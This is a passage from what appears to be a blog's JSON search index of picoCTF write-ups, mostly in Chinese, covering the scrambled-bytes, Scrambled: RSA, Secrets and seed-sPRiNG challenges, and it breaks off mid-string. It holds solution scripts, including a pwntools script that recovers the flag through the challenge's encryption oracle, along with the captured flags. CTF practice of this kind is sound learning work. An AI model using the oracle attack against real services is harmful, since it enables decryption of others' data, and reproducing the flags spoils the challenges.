\u0026#39;3e\u0026#39;, \u0026#39;cb\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;3b\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;7d\u0026#39;, \u0026#39;ff\u0026#39;, \u0026#39;d5\u0026#39;, \u0026#39;57\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;ec\u0026#39;, \u0026#39;ee\u0026#39;, \u0026#39;b2\u0026#39;, \u0026#39;8b\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;8a\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;e6\u0026#39;, \u0026#39;08\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;ab\u0026#39;, \u0026#39;3d\u0026#39;, \u0026#39;f8\u0026#39;, \u0026#39;af\u0026#39;, \u0026#39;99\u0026#39;, \u0026#39;54\u0026#39;, \u0026#39;b1\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;8c\u0026#39;, \u0026#39;03\u0026#39;, \u0026#39;aa\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;d0\u0026#39;, \u0026#39;bc\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;3d\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;ba\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;03\u0026#39;, \u0026#39;c2\u0026#39;, \u0026#39;8e\u0026#39;, \u0026#39;8c\u0026#39;, \u0026#39;83\u0026#39;, \u0026#39;d9\u0026#39;, \u0026#39;4a\u0026#39;, \u0026#39;f0\u0026#39;, \u0026#39;cc\u0026#39;, \u0026#39;8f\u0026#39;, \u0026#39;1c\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;c1\u0026#39;, \u0026#39;cd\u0026#39;, \u0026#39;3e\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;b2\u0026#39;, \u0026#39;3d\u0026#39;, \u0026#39;a2\u0026#39;, \u0026#39;b9\u0026#39;, \u0026#39;ac\u0026#39;, \u0026#39;ba\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;7b\u0026#39;, \u0026#39;d3\u0026#39;, \u0026#39;9a\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;f5\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;0c\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;7f\u0026#39;, \u0026#39;7c\u0026#39;, \u0026#39;71\u0026#39;, \u0026#39;7f\u0026#39;, \u0026#39;9b\u0026#39;, \u0026#39;f5\u0026#39;, \u0026#39;e3\u0026#39;, \u0026#39;1a\u0026#39;, \u0026#39;f6\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;fd\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;e3\u0026#39;, \u0026#39;0e\u0026#39;, \u0026#39;e0\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;02\u0026#39;, \u0026#39;3b\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;14\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;1f\u0026#39;, \u0026#39;a7\u0026#39;, \u0026#39;cb\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;f2\u0026#39;, \u0026#39;a2\u0026#39;, \u0026#39;b1\u0026#39;, \u0026#39;5b\u0026#39;, \u0026#39;84\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;68\u0026#39;, \u0026#39;98\u0026#39;, \u0026#39;02\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;ca\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;71\u0026#39;, \u0026#39;05\u0026#39;, \u0026#39;08\u0026#39;, \u0026#39;7f\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;84\u0026#39;, \u0026#39;cb\u0026#39;, \u0026#39;a7\u0026#39;, \u0026#39;3c\u0026#39;, \u0026#39;62\u0026#39;, \u0026#39;bd\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;ea\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;68\u0026#39;, \u0026#39;1e\u0026#39;, \u0026#39;f7\u0026#39;, \u0026#39;ba\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;01\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;7d\u0026#39;, \u0026#39;e3\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;d2\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;8a\u0026#39;, \u0026#39;7b\u0026#39;, \u0026#39;ca\u0026#39;, \u0026#39;9f\u0026#39;, \u0026#39;ef\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;e4\u0026#39;, \u0026#39;ff\u0026#39;, \u0026#39;9e\u0026#39;, \u0026#39;dc\u0026#39;, \u0026#39;6e\u0026#39;, \u0026#39;0e\u0026#39;, \u0026#39;1d\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;63\u0026#39;, \u0026#39;d6\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;60\u0026#39;, \u0026#39;b9\u0026#39;, \u0026#39;d8\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;d8\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;07\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;7a\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;7d\u0026#39;, \u0026#39;1d\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;c1\u0026#39;, \u0026#39;e9\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;e1\u0026#39;, \u0026#39;d9\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;b3\u0026#39;, \u0026#39;ae\u0026#39;, \u0026#39;4a\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;89\u0026#39;, \u0026#39;d4\u0026#39;, \u0026#39;67\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;ca\u0026#39;, \u0026#39;5a\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;4b\u0026#39;, \u0026#39;fe\u0026#39;, \u0026#39;10\u0026#39;, \u0026#39;3c\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;9f\u0026#39;, \u0026#39;7b\u0026#39;, \u0026#39;9e\u0026#39;, \u0026#39;e8\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;b4\u0026#39;, \u0026#39;78\u0026#39;, \u0026#39;ef\u0026#39;, \u0026#39;b3\u0026#39;, \u0026#39;95\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;5f\u0026#39;, \u0026#39;be\u0026#39;, \u0026#39;a2\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;69\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;7c\u0026#39;, \u0026#39;1f\u0026#39;, \u0026#39;63\u0026#39;, \u0026#39;f9\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;16\u0026#39;, \u0026#39;80\u0026#39;, \u0026#39;62\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;d4\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;08\u0026#39;, \u0026#39;9c\u0026#39;, \u0026#39;8c\u0026#39;, \u0026#39;ba\u0026#39;, \u0026#39;f7\u0026#39;, \u0026#39;d0\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;9f\u0026#39;, \u0026#39;0c\u0026#39;, \u0026#39;ac\u0026#39;, \u0026#39;04\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;7c\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;a6\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;fe\u0026#39;, \u0026#39;8a\u0026#39;, \u0026#39;ec\u0026#39;, \u0026#39;ab\u0026#39;, \u0026#39;79\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;af\u0026#39;, \u0026#39;3b\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;d7\u0026#39;, \u0026#39;9f\u0026#39;, \u0026#39;8c\u0026#39;, \u0026#39;bb\u0026#39;, \u0026#39;75\u0026#39;, \u0026#39;2e\u0026#39;, \u0026#39;03\u0026#39;, \u0026#39;9e\u0026#39;, \u0026#39;1c\u0026#39;, \u0026#39;05\u0026#39;, \u0026#39;b5\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;b1\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;ec\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;dc\u0026#39;, \u0026#39;e9\u0026#39;, \u0026#39;71\u0026#39;, \u0026#39;a8\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;be\u0026#39;, \u0026#39;4c\u0026#39;, \u0026#39;7d\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;d4\u0026#39;, \u0026#39;e9\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;e0\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;71\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;57\u0026#39;, \u0026#39;d4\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;a2\u0026#39;, \u0026#39;d5\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;b2\u0026#39;, \u0026#39;7b\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;57\u0026#39;, \u0026#39;ab\u0026#39;, \u0026#39;7d\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;ee\u0026#39;, \u0026#39;e0\u0026#39;, \u0026#39;d4\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;df\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;78\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;95\u0026#39;, \u0026#39;f9\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;ad\u0026#39;, \u0026#39;54\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;d7\u0026#39;, \u0026#39;19\u0026#39;, \u0026#39;52\u0026#39;, \u0026#39;bf\u0026#39;, \u0026#39;7c\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;c2\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;05\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;8e\u0026#39;, \u0026#39;8e\u0026#39;, \u0026#39;e9\u0026#39;, \u0026#39;f9\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;ab\u0026#39;, \u0026#39;c1\u0026#39;, \u0026#39;a4\u0026#39;, \u0026#39;b7\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;58\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;d6\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;6b\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;86\u0026#39;, \u0026#39;d3\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;f8\u0026#39;, \u0026#39;1f\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;1a\u0026#39;, \u0026#39;98\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;bb\u0026#39;, \u0026#39;4b\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;a6\u0026#39;, \u0026#39;f8\u0026#39;, \u0026#39;98\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;b9\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;f7\u0026#39;, \u0026#39;0a\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;eb\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;1f\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;83\u0026#39;, \u0026#39;e0\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;2e\u0026#39;, \u0026#39;e9\u0026#39;, \u0026#39;3d\u0026#39;, \u0026#39;62\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;9d\u0026#39;, \u0026#39;5c\u0026#39;, \u0026#39;ff\u0026#39;, \u0026#39;a6\u0026#39;, \u0026#39;bb\u0026#39;, \u0026#39;3e\u0026#39;, \u0026#39;6b\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;4c\u0026#39;, \u0026#39;b1\u0026#39;, \u0026#39;cd\u0026#39;, \u0026#39;a3\u0026#39;, \u0026#39;71\u0026#39;, \u0026#39;83\u0026#39;, \u0026#39;ea\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;e4\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;6a\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;f3\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;52\u0026#39;, \u0026#39;c4\u0026#39;, \u0026#39;4c\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;c8\u0026#39;, \u0026#39;5f\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;c3\u0026#39;, \u0026#39;9a\u0026#39;, \u0026#39;68\u0026#39;, \u0026#39;e8\u0026#39;, \u0026#39;4f\u0026#39;, \u0026#39;7e\u0026#39;, \u0026#39;17\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;c2\u0026#39;, \u0026#39;bd\u0026#39;, \u0026#39;96\u0026#39;, \u0026#39;7f\u0026#39;, \u0026#39;1d\u0026#39;, \u0026#39;c6\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;8b\u0026#39;, \u0026#39;c8\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;8d\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;9d\u0026#39;, \u0026#39;aa\u0026#39;, \u0026#39;da\u0026#39;, \u0026#39;6b\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;c0\u0026#39;, \u0026#39;e5\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;d2\u0026#39;, \u0026#39;e8\u0026#39;, \u0026#39;cb\u0026#39;, \u0026#39;df\u0026#39;, \u0026#39;ed\u0026#39;, \u0026#39;69\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;c5\u0026#39;, \u0026#39;0d\u0026#39;, \u0026#39;0e\u0026#39;, \u0026#39;77\u0026#39;, \u0026#39;52\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;f7\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;c9\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;86\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;3b\u0026#39;, \u0026#39;68\u0026#39;, \u0026#39;08\u0026#39;, \u0026#39;5f\u0026#39;, \u0026#39;da\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;fe\u0026#39;, \u0026#39;6c\u0026#39;, \u0026#39;ac\u0026#39;, \u0026#39;ff\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;6a\u0026#39;, \u0026#39;ff\u0026#39;, \u0026#39;bc\u0026#39;, \u0026#39;f5\u0026#39;, \u0026#39;e4\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;8f\u0026#39;, \u0026#39;7c\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;1b\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;f7\u0026#39;, \u0026#39;b4\u0026#39;, \u0026#39;ca\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;53\u0026#39;, \u0026#39;fa\u0026#39;, \u0026#39;7e\u0026#39;, \u0026#39;3c\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;b3\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;e7\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;1f\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;2a\u0026#39;, \u0026#39;96\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;2a\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;ee\u0026#39;, \u0026#39;58\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;a0\u0026#39;, \u0026#39;c1\u0026#39;, \u0026#39;9c\u0026#39;, \u0026#39;62\u0026#39;, \u0026#39;da\u0026#39;, \u0026#39;2c\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;ed\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;c7\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;1a\u0026#39;, \u0026#39;eb\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;98\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;8f\u0026#39;, \u0026#39;96\u0026#39;, \u0026#39;3d\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;02\u0026#39;, \u0026#39;3a\u0026#39;, \u0026#39;5d\u0026#39;, \u0026#39;7c\u0026#39;, \u0026#39;1d\u0026#39;, \u0026#39;a6\u0026#39;, \u0026#39;c4\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;ef\u0026#39;, \u0026#39;a1\u0026#39;, \u0026#39;b1\u0026#39;, \u0026#39;d1\u0026#39;, \u0026#39;a5\u0026#39;, \u0026#39;b1\u0026#39;, \u0026#39;b4\u0026#39;, \u0026#39;b8\u0026#39;, \u0026#39;b3\u0026#39;, \u0026#39;6f\u0026#39;, \u0026#39;ae\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;be\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;ea\u0026#39;, \u0026#39;2f\u0026#39;, \u0026#39;81\u0026#39;, \u0026#39;99\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;8f\u0026#39;, \u0026#39;86\u0026#39;, \u0026#39;0e\u0026#39;, \u0026#39;f2\u0026#39;, \u0026#39;3f\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;c2\u0026#39;, \u0026#39;ed\u0026#39;, \u0026#39;b7\u0026#39;, \u0026#39;81\u0026#39;, \u0026#39;db\u0026#39;, \u0026#39;0f\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;a9\u0026#39;, \u0026#39;b0\u0026#39;, \u0026#39;7a\u0026#39;, \u0026#39;f2\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;7e\u0026#39;, \u0026#39;ab\u0026#39;, \u0026#39;2c\u0026#39;, \u0026#39;3f\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;17\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;d3\u0026#39;, \u0026#39;9f\u0026#39;, \u0026#39;5e\u0026#39;, \u0026#39;73\u0026#39;, \u0026#39;e6\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;c3\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;dc\u0026#39;, \u0026#39;0b\u0026#39;, \u0026#39;b4\u0026#39;, \u0026#39;0c\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;e7\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;dc\u0026#39;, \u0026#39;a9\u0026#39;, \u0026#39;f9\u0026#39;, \u0026#39;d9\u0026#39;, \u0026#39;1f\u0026#39;, \u0026#39;0b\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;f4\u0026#39;, \u0026#39;b8\u0026#39;, \u0026#39;fb\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;de\u0026#39;, \u0026#39;0e\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;87\u0026#39;, \u0026#39;58\u0026#39;, \u0026#39;a3\u0026#39;, \u0026#39;6e\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;67\u0026#39;, \u0026#39;f6\u0026#39;, \u0026#39;5c\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;4b\u0026#39;, \u0026#39;a3\u0026#39;, \u0026#39;ce\u0026#39;, \u0026#39;cc\u0026#39;, \u0026#39;bf\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;b5\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;9b\u0026#39;, \u0026#39;00\u0026#39;, \u0026#39;8b\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;87\u0026#39;, \u0026#39;6d\u0026#39;, \u0026#39;df\u0026#39;, \u0026#39;1f\u0026#39;, \u0026#39;cc\u0026#39;, \u0026#39;d0\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;f1\u0026#39;, \u0026#39;16\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;08\u0026#39;] seed = 1614044650 random.seed(seed) shuffle_idx = [i for i in range(len(data))] print(len(shuffle_idx)) random.shuffle(shuffle_idx) decoded = bytearray([0 for i in range(len(data))]) for i in range(len(data)): dummy = random.randrange(65536) tmp= int(data[i], 16) ^ random.randrange(256) decoded[shuffle_idx[i]] = tmp print(decoded) f = open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;) f.write(decoded) f.close() Flag: picoCTF{n0_t1m3_t0_w4st3_5hufflin9_ar0und}\nReference # PicoMini Misc scrambled-bytes WP - 0x534b\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nPermissionError: [Errno 1] Operation not permitted\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nenv: python\\r: No such file or directory\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nReport the error\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":310,"href":"/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/","title":"PicoCTF - Scrambled: RSA","section":"Securities","content":" PicoCTF - Scrambled: RSA # tags: PicoCTF CTF Crypto # Hint # Look at the ciphertext, anything fishy, maybe a little bit long? What happens if you encrypt the same input multiple times? Is RSA deterministic, why would outputs vary? Recon - 通靈 # 這一題也是頗有趣但要通靈，可以先亂Try\n$ nc mercury.picoctf.net 61477 flag = ... I will encrypt whatever you give me: b Here you go: 26990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237 I will encrypt whatever you give me: ba Here you go: 2699004973557840903068237896554908567634409148106041965530669507822650040067943518091441485384345651795926993802543646237181316747733988751129332049819566771732087961765397407420468704229488779578412271162151048595114284277095132529867781110270620027540689911789424114557560291245144389268725220840201190423748281433709412944662646587136176334777506529508638551296181668932027523016538393747587852449462326357575277427356480410273494280971757044562513629423400967407332448126388859817313684399195291279961899276921240210270110225654310423792352532266414306766344869066386142998118001891330035563388790707576505068944 I will encrypt whatever you give me: bac Here you go: 482814337094129446626465871361763347775065295086385512961816689320275230165383937475878524494623263575752774273564804102734942809717570445625136294234009674073324481263888598173136843991952912799618992769212402102701102256543104237923525322664143067663448690663861429981180018913300355633887907075765050689449619429085627210113794723864117161956939961066630142420889676674025917593454737310140819887001206562193281145515990410131903949359211712425034234736366286462137700473579439657314154736719868903719111785858132034797052503447042089004862886989401543635700329455353580959453911569277021402998961166474045310601826990049735578409030682378965549085676344091481060419655306695078226500400679435180914414853843456517959269938025436462371813167477339887511293320498195667717320879617653974074204687042294887795784122711621510485951142842770951325298677811102706200275406899117894241145575602912451443892687252208402011904237 ... 一開始加密的b是269900...904237，第二個加密的ba是26990...5068944，但如果仔細看其實第一個加密的密文其實也存在其中，他其實是269900...904237+482814...5068944，可以加密第三個bac試看看，也會發現是482814...5068944+961942...3106018+269900...904237 所以我們可以再往這個方向測試一下，我們知道一開始的flag一定是picoCTF{，我們加密p會發現密文其實存在原始的flag密文當中，因此我們可以寫一個腳本，像上一題一樣暴力破解，如果加密的密文有存在原本的flag ciphertext中的話，就代表我們猜對了，反之就繼續找\nExploit - 通靈 # from pwn import * import gmpy2 from tqdm import tqdm context.arch = \u0026#34;amd64\u0026#34; r = remote(\u0026#34;mercury.picoctf.net\u0026#34;, 61477) flag = r.recvline().strip().decode().split(\u0026#34; \u0026#34;)[-1] n = r.recvline().strip().decode().split(\u0026#34; \u0026#34;)[-1] e = r.recvline().strip().decode().split(\u0026#34; \u0026#34;)[-1] def call_oracle(plaintext): r.recvuntil(b\u0026#34;I will encrypt whatever you give me: \u0026#34;) r.sendline(plaintext.encode()) return r.recvline().strip().decode().split(\u0026#34; \u0026#34;)[-1] current_char = \u0026#34;\u0026#34; #output_flag = \u0026#34;picoCTF{bad_1d3a5\u0026#34; output_flag = \u0026#34;\u0026#34; the_last_cipher = [] #for i in range(1, len(output_flag)+1): # output = call_oracle(output_flag[:i]) # for j in the_last_cipher: # output = output.replace(j, \u0026#34;\u0026#34;) # the_last_cipher.append(output) while current_char != \u0026#34;}\u0026#34;: for i in string.printable: output = call_oracle(output_flag + i) for j in the_last_cipher: output = output.replace(j, \u0026#34;\u0026#34;) if output in flag: the_last_cipher.append(output) current_char = i output_flag += i print(output_flag) break ::: info Note that: 如果因為連線時間過長導致連線中斷，且沒有找完所有的字元，請把27行和31-35行的註解拿掉，並把已經找到的字元填入output_flag :::\nReference # maple3142 - Scrambled: RSA picoCTF 2021 Scrambled RSA\n"},{"id":311,"href":"/security/practice/picoctf/web/picoctf---secrets/","title":"PicoCTF - Secrets","section":"Securities","content":" PicoCTF - Secrets # tags: PicoCTF CTF Web # Recon # Description: We have several pages hidden. Can you find the one with the flag? Hint: folders folders folders 這一題也是蠻有趣的\nExploit - 通靈 # 首先看一下網頁的source code，沒什麼特別的地方，但有看到secret/assets/index.css，所以有一個route是secrets，試看看有甚麼東西 發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了 Payload: view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/ Flag: picoCTF{succ3ss_@h3n1c@10n_790d2615}\nReference # secrets | picoCTF 2022 "},{"id":312,"href":"/security/practice/picoctf/pwn/picoctf---seed-spring/","title":"PicoCTF - seed-sPRiNG","section":"Securities","content":" PicoCTF - seed-sPRiNG # Source code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { int guess_height; // [esp+0h] [ebp-18h] BYREF int ans; // [esp+4h] [ebp-14h] unsigned int seed; // [esp+8h] [ebp-10h] int i; // [esp+Ch] [ebp-Ch] int *p_argc; // [esp+10h] [ebp-8h] p_argc = \u0026amp;argc; puts(\u0026amp;unk_A50); puts(\u0026amp;unk_A50); puts(\u0026#34; \u0026#34;); puts(\u0026#34; # mmmmm mmmmm \\\u0026#34; mm m mmm \u0026#34;); puts(\u0026#34; mmm mmm mmm mmm# mmm # \\\u0026#34;# # \\\u0026#34;# mmm #\\\u0026#34;m # m\\\u0026#34; \\\u0026#34;\u0026#34;); puts(\u0026#34; # \\\u0026#34; #\\\u0026#34; # #\\\u0026#34; # #\\\u0026#34; \\\u0026#34;# # \\\u0026#34; #mmm#\\\u0026#34; #mmmm\\\u0026#34; # # #m # # mm\u0026#34;); puts(\u0026#34; \\\u0026#34;\\\u0026#34;\\\u0026#34;m #\\\u0026#34;\\\u0026#34;\\\u0026#34;\\\u0026#34; #\\\u0026#34;\\\u0026#34;\\\u0026#34;\\\u0026#34; # # \\\u0026#34;\\\u0026#34;\\\u0026#34;m # # \\\u0026#34;m # # # # # #\u0026#34;); puts(\u0026#34; \\\u0026#34;mmm\\\u0026#34; \\\u0026#34;#mm\\\u0026#34; \\\u0026#34;#mm\\\u0026#34; \\\u0026#34;#m## \\\u0026#34;mmm\\\u0026#34; # # \\\u0026#34; mm#mm # ## \\\u0026#34;mmm\\\u0026#34;\u0026#34;); puts(\u0026#34; \u0026#34;); puts(\u0026amp;unk_A50); puts(\u0026amp;unk_A50); puts(\u0026#34;Welcome! 